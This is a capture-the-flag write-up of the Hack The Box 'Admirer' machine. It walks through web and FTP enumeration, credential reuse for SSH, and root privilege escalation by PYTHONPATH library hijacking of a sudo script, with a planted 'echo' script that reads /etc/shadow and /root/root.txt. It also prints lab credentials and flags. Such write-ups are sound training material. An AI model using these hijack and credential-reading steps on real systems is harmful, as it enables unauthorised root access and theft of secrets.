# [22 - Admirer](https://app.hackthebox.com/machines/Admirer)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [21](#21)
    * [trying ssh credentials](#trying-ssh-credentials)
    * [back to admin_tasks.php](#back-to-admin_tasks.php)
    * [adminer.php](#adminer.php)
    * [waldo up](#waldo-up)
  * [flag](#flag)
![Admirer.png](Admirer.png)

## description
> 10.10.10.187

## walkthrough

### recon

```
 $ nmap -sV -sC -A -Pn -p- admirer.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-03 16:48 MDT
Nmap scan report for admirer.htb (10.10.10.187)
Host is up (0.062s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

haven't seen ftp in a minute - also thanks for looking at robots.txt contents nmap

### 80

waiting for nmap, presumed web.

pretty basic image gallery with some 'cute' phrases under 'inspiring' images

towards the bottom:
```html
<h2>Get in touch</h2>
<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
```


`/admin-dir` gives a 403

the actual contents of robots.txt

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir

```

probably a username in `waldo`

```
$ gobuster dir -u http://admirer.htb/admin-dir -x txt -r -t 40 -w ~/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admirer.htb/admin-dir
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /home/conor/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/09/03 17:02:09 Starting gobuster in directory enumeration mode
===============================================================
/contacts.txt         (Status: 200) [Size: 350]
```

oi, that's a bit silly.

a few more usernames
  * p.wise
  * r.nayyar
  * a.bialki
  * l.galecki
  * h.helberg
  * b.rauch

robots.txt said contacts _and creds_, so guessing we need to use these names to find their creds via gobuster

or just keep waiting, because

```
/credentials.txt      (Status: 200) [Size: 136]
```

nice.

```
$ cat credentials.txt
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

### 21

```
$ ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:conor): anonymous
530 Permission denied.
ftp: Login failed
```

hrm. msfconsole shows an exploit for vsftpd 2.3.4, and exploitdb only shows a DoS for 3.0.3

```
$ ftp admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)
Name (admirer.htb:conor): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10598|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
229 Entering Extended Passive Mode (|||36183|)
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
100% |*************************************************************************************************************************************************|  3405        1.78 MiB/s    00:00 ETA
226 Transfer complete.
3405 bytes received in 00:00 (55.98 KiB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
229 Entering Extended Passive Mode (|||16268|)
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
100% |*************************************************************************************************************************************************|  5147 KiB    1.94 MiB/s    00:00 ETA
226 Transfer complete.
5270987 bytes received in 00:02 (1.90 MiB/s)
ftp>
```

[dump.sql](dump.sql) is just the paths to images and their quotes
[html.tar.gz](html.tar.gz) is

```
$ tree html
html
├── assets
│   ├── css
│   │   ├── fontawesome-all.min.css
│   │   ├── images
│   │   │   ├── arrow.svg
│   │   │   ├── close.svg
│   │   │   └── spinner.svg
│   │   ├── main.css
│   │   └── noscript.css
│   ├── js
│   │   ├── breakpoints.min.js
│   │   ├── browser.min.js
│   │   ├── jquery.min.js
│   │   ├── jquery.poptrox.min.js
│   │   ├── main.js
│   │   └── util.js
│   ├── sass
│   │   ├── base
│   │   │   ├── _page.scss
│   │   │   ├── _reset.scss
│   │   │   └── _typography.scss
│   │   ├── components
│   │   │   ├── _actions.scss
│   │   │   ├── _button.scss
│   │   │   ├── _form.scss
│   │   │   ├── _icon.scss
│   │   │   ├── _icons.scss
│   │   │   ├── _list.scss
│   │   │   ├── _panel.scss
│   │   │   ├── _poptrox-popup.scss
│   │   │   └── _table.scss
│   │   ├── layout
│   │   │   ├── _footer.scss
│   │   │   ├── _header.scss
│   │   │   ├── _main.scss
│   │   │   └── _wrapper.scss
│   │   ├── libs
│   │   │   ├── _breakpoints.scss
│   │   │   ├── _functions.scss
│   │   │   ├── _mixins.scss
│   │   │   ├── _vars.scss
│   │   │   └── _vendor.scss
│   │   ├── main.scss
│   │   └── noscript.scss
│   └── webfonts
│       ├── fa-brands-400.eot
│       ├── fa-brands-400.svg
│       ├── fa-brands-400.ttf
│       ├── fa-brands-400.woff
│       ├── fa-brands-400.woff2
│       ├── fa-regular-400.eot
│       ├── fa-regular-400.svg
│       ├── fa-regular-400.ttf
│       ├── fa-regular-400.woff
│       ├── fa-regular-400.woff2
│       ├── fa-solid-900.eot
│       ├── fa-solid-900.svg
│       ├── fa-solid-900.ttf
│       ├── fa-solid-900.woff
│       └── fa-solid-900.woff2
├── images
│   ├── fulls
│   │   ├── arch01.jpg
│   │   ├── arch02.jpg
│   │   ├── art01.jpg
│   │   ├── art02.jpg
│   │   ├── eng01.jpg
│   │   ├── eng02.jpg
│   │   ├── mind01.jpg
│   │   ├── mind02.jpg
│   │   ├── mus01.jpg
│   │   ├── mus02.jpg
│   │   ├── nat01.jpg
│   │   └── nat02.jpg
│   └── thumbs
│       ├── thmb_arch01.jpg
│       ├── thmb_arch02.jpg
│       ├── thmb_art01.jpg
│       ├── thmb_art02.jpg
│       ├── thmb_eng01.jpg
│       ├── thmb_eng02.jpg
│       ├── thmb_mind01.jpg
│       ├── thmb_mind02.jpg
│       ├── thmb_mus01.jpg
│       ├── thmb_mus02.jpg
│       ├── thmb_nat01.jpg
│       └── thmb_nat02.jpg
├── index.php
├── robots.txt
├── utility-scripts
│   ├── admin_tasks.php
│   ├── db_admin.php
│   ├── info.php
│   └── phptest.php
└── w4ld0s_s3cr3t_d1r
    ├── contacts.txt
    └── credentials.txt
```

we've already got [contacts.txt](contacts.txt) and [credentials.txt](credentials.txt)

`utility-scripts` looks interesting:

```
$ cat html/utility-scripts/info.php
<?php phpinfo(); ?>
$ cat html/utility-scripts/phptest.php
<?php
  echo("Just a test to see if PHP works.");
?>
```

ok so not those, but

`db_admin.php`:
```php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

`admin_tasks.php`:
```php
  <?php
  // Web Interface to the admin_tasks script
  //
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /***********************************************************************************
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  }
  ?>
```

so it feels like RCE via `admin_tasks.php`, but we only have one injection point, `$task`, which is only passed as an argument if it is `1..7`. null bytes? solved in php 5.0.3 and we're on 7.0.33


### trying ssh credentials

```
$ ssh -l ftpuser admirer.htb
Warning: Permanently added 'admirer.htb' (ED25519) to the list of known hosts.
ftpuser@admirer.htb's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Connection to admirer.htb closed.
```

so it's letting us log in, but then immediately killing the session. can't execute commands

tried a variety of auths with users from contacts.txt and passwords from credentials.txt, but nothing sticking.

looking back over the contents of [html.tar.gz](html.tar.gz), there is a difference in credentials.txt:
```
$ diff credentials.txt html/w4ld0s_s3cr3t_d1r/credentials.txt
0a1,4
> [Bank Account]
> waldo.11
> Ezy]m27}OREc$
>
```

but that is not the ssh password for `waldo` either..

more digging in the contents, see that `index.php` actually has `db_admin.php` (effectively) inlined, but the creds are different:
```
		 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";
```

but still no love on ssh

penny, leonard, howard and bernadette are all characters on that god awful show "the big bang theory" - is waldo a reference there too?

### back to admin_tasks.php

when sending `task=2.0`, get `Unknown option.`

but `task=10` gets `Invalid task.`

the second is in the code we have, but the first is not

### adminer.php


`// TODO: Finish implementing this or find a better open source alternative`

since `db_admin.php` is 404, they must have done this TODO.

`adminer.php` is the new name for phpMyAdmin, and sure enough, this page gives us a prompt to login to a db

...

and the password is the same for ssh login for waldo

```
$ ssh -l waldo admirer.htb
Warning: Permanently added 'admirer.htb' (ED25519) to the list of known hosts.
waldo@admirer.htb's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$
```

### waldo up

```
waldo@admirer:~$ cat user.txt
4cb9ac201c71dfb64b438317bf100869
waldo@admirer:~$ mail
"/var/mail/waldo": 20 messages 20 new
>N   1 Cron Daemon        Wed Apr 22 11:50  21/719   Cron <root@admirer> rm -r /tmp/*
 N   2 Cron Daemon        Wed Apr 22 11:55  21/719   Cron <root@admirer> rm -r /tmp/*
 N   3 Cron Daemon        Wed Apr 22 12:00  21/719   Cron <root@admirer> rm -r /tmp/*
 N   4 Cron Daemon        Wed Apr 29 09:50  21/719   Cron <root@admirer> rm -r /tmp/*
 N   5 Cron Daemon        Wed Apr 29 09:55  21/719   Cron <root@admirer> rm -r /tmp/*
 N   6 Cron Daemon        Wed Apr 29 10:00  21/719   Cron <root@admirer> rm -r /tmp/*
 N   7 Cron Daemon        Wed Apr 29 10:05  21/719   Cron <root@admirer> rm -r /tmp/*
 N   8 Cron Daemon        Wed Apr 29 10:10  21/719   Cron <root@admirer> rm -r /tmp/*
 N   9 Cron Daemon        Wed Apr 29 10:15  21/719   Cron <root@admirer> rm -r /tmp/*
 N  10 Cron Daemon        Wed Apr 29 10:20  21/719   Cron <root@admirer> rm -r /tmp/*
 N  11 Cron Daemon        Wed Apr 29 10:40  21/719   Cron <root@admirer> rm -r /tmp/*
 N  12 Cron Daemon        Wed Apr 29 10:45  21/719   Cron <root@admirer> rm -r /tmp/*
 N  13 Cron Daemon        Wed Apr 29 10:50  21/719   Cron <root@admirer> rm -r /tmp/*
 N  14 Cron Daemon        Wed Apr 29 10:55  21/719   Cron <root@admirer> rm -r /tmp/*
 N  15 Cron Daemon        Wed Apr 29 11:05  21/719   Cron <root@admirer> rm -r /tmp/*
 N  16 Cron Daemon        Wed Apr 29 11:09  21/723   Cron <root@admirer> rm -r /tmp/*.*
 N  17 Cron Daemon        Wed Apr 29 11:10  21/736   Cron <root@admirer> rm /home/waldo/*.p*
 N  18 Cron Daemon        Wed Apr 29 11:12  21/736   Cron <root@admirer> rm /home/waldo/*.p*
 N  19 Cron Daemon        Wed Apr 29 11:13  21/736   Cron <root@admirer> rm /home/waldo/*.p*
 N  20 Cron Daemon        Wed Apr 29 11:14  21/736   Cron <root@admirer> rm /home/waldo/*.p*
?
```

ok, so root is running something out of waldo's home dir

```
waldo@admirer:~$ ls -la /opt/
total 12
drwxr-xr-x  3 root root   4096 Nov 30  2019 .
drwxr-xr-x 22 root root   4096 Apr 16  2020 ..
drwxr-xr-x  2 root admins 4096 Dec  2  2019 scripts
waldo@admirer:~$ ls -la /opt/scripts/
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```

`admin_tasks.sh` is what we expect, and has appropriate UID checks.

`backup.py` points us to `/srv/ftp`, which exists, but we have no permissions to.

linpeas to see what we're missing
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

...

╔══════════╣ Users with console
amy:x:1004:1007:Amy Bialik:/home/amy:/bin/bash
bernadette:x:1007:1010:Bernadette Rauch:/home/bernadette:/bin/bash
howard:x:1008:1011:Howard Helberg:/home/howard:/bin/bash
leonard:x:1005:1008:Leonard Galecki:/home/leonard:/bin/bash
penny:x:1002:1005:Penny Wise:/home/penny:/bin/bash
rajesh:x:1003:1006:Rajesh Nayyar:/home/rajesh:/bin/bash
root:x:0:0:root:/root:/bin/bash
waldo:x:1000:1000:Waldo Cooper:/home/waldo:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
uid=1001(ftpuser) gid=1002(ftpuser) groups=1002(ftpuser),111(ftp)
uid=1002(penny) gid=1005(penny) groups=1005(penny),1001(admins)
uid=1003(rajesh) gid=1006(rajesh) groups=1006(rajesh),1003(developers)
uid=1004(amy) gid=1007(amy) groups=1007(amy),1003(developers)
uid=1005(leonard) gid=1008(leonard) groups=1008(leonard),1003(developers)
uid=1007(bernadette) gid=1010(bernadette) groups=1010(bernadette),1004(designers)
uid=1008(howard) gid=1011(howard) groups=1011(howard),1004(designers)

...

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
...
-rwsr-xr-x 1 root root 996K Sep  3  2019 /usr/sbin/exim4

...

╔══════════╣ Files inside others home (limit 20)
/home/leonard/.profile
/home/leonard/user.txt
/home/leonard/.bashrc
/home/leonard/.bash_logout
/home/rajesh/.profile
/home/rajesh/user.txt
/home/rajesh/.bashrc
/home/rajesh/.bash_logout
/home/bernadette/.profile
/home/bernadette/user.txt
/home/bernadette/.bashrc
/home/bernadette/.bash_logout
/home/amy/.profile
/home/amy/user.txt
/home/amy/.bashrc
/home/amy/.bash_logout
/home/howard/.profile
/home/howard/user.txt
/home/howard/.bashrc
/home/howard/.bash_logout


```

hmm - everyone has a user.txt?

```
waldo@admirer:~$ cat /home/bernadette/user.txt
This is your home folder. Use it well.
waldo@admirer:~$ cat /home/rajesh/user.txt
This is your home folder. Use it well.
```

red herring. maybe exim4?

but first let's check sudo/crontab


```
waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ crontab -l
no crontab for waldo

```


`SETENV` means we can control environment variables and run `admin_tasks.sh` which sounds like a $PATH vuln, but quick look shows all commands are fully pathed, and we don't have write access to the file itself

grabbing root cron while we're here

```
waldo@admirer:~$ sudo /opt/scripts/admin_tasks.sh 3
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
```

ok well those `rm` commands are not fully pathed

and .. to be fair, `echo` is a command and isn't path'd either.

but
```
waldo@admirer:~$ cat echo
#!/bin/bash
cat /root/root.txt > /tmp/foo.txt
cat /etc/shadow
cat /root/root.txt
/bin/echo $*
waldo@admirer:~$ PATH=/home/waldo/:$PATH sudo /opt/scripts/admin_tasks.sh
```

isn't getting triggered.

but [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) points us to `PYTHONPATH` hijacking

```
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

that looks ripe. copy `shutil.py` and modify `make_archive` to include
```
   os.system("cat /root/root.txt > /tmp/foo.txt")
```

then trigger a backup

```
waldo@admirer:~$ sudo PYTHONPATH=. /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:~$ ls -l /tmp
total 8
-rw-r--r-- 1 root root   33 Sep  4 16:17 foo.txt
drwx------ 2 root root 4096 Sep  3 23:48 vmware-root
```

had to retrigger this a few times since the root cronjob is deleting python scripts in our home dir, and all files in /tmp

but eventually

```
waldo@admirer:~$ cat /tmp/foo.txt
d8dac6a7dd3937b5e9da4c5fd00ac2ce
```

## flag

```
user:4cb9ac201c71dfb64b438317bf100869
root:d8dac6a7dd3937b5e9da4c5fd00ac2ce
```